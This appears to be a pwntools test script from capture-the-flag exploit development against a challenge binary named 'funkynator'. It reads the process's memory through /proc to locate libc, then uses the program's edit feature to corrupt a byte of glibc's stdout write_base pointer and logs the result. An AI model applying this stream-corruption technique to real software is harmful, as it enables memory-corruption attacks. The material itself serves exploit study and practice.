#!/usr/bin/env python3
"""Test that reports exit status."""
from pwn import *
import struct, time, signal
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))

r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

for _ in range(2):
    r.sendline(b'2')
    r.recvuntil(b'length')
    r.recvline()
    r.sendline(b'5')
    r.recvuntil(b'message:')
    r.sendline(b'A' * 5)
    r.recvuntil(b'?')
    r.sendline(b'n')
    r.recvuntil(b'?')
    r.sendline(b'y')
    r.recvuntil(b'location')
    r.recvline()
    r.recvuntil(b'> ')

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
off = ((libc_base + STDOUT + WB_OFF + 1) - msg2) & 0xFFFFFFFFFFFFFFFF

# Verify addresses by reading write_base from the proc mem
with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    wb_check = struct.unpack('<Q', f.read(8))[0]
    assert wb_check == orig_wb, f"Write base changed! {wb_check:#x} != {orig_wb:#x}"
    
    # Also read write_ptr and write_end
    f.seek(libc_base + STDOUT + WB_OFF + 0x08)
    wp = struct.unpack('<Q', f.read(8))[0]
    f.seek(libc_base + STDOUT + WB_OFF + 0x10)
    we = struct.unpack('<Q', f.read(8))[0]
    
log.info(f"Before overwrite: wb={orig_wb:#x} wp={wp:#x} we={we:#x}")
log.info(f"wb < wp? {orig_wb < wp}")

# Enter editor
r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'with what')
r.recvline()
r.send(bytes([new_byte1]) + b'\n')

import time
time.sleep(1)

# Check process status
ret = ret = r.proc.poll()
log.info(f"Process return code: {ret}")
if ret is None:
    log.info("Process still running")
    try:
        data = r.recv(timeout=2)
        log.info(f"Got {len(data)} bytes")
    except:
        log.info("No data available")
elif ret < 0:
    sig = -ret
    log.info(f"Process killed by signal {sig}")
elif ret == 0:
    log.info("Process exited normally")
else:
    log.info(f"Process exited with code {ret}")

r.close()
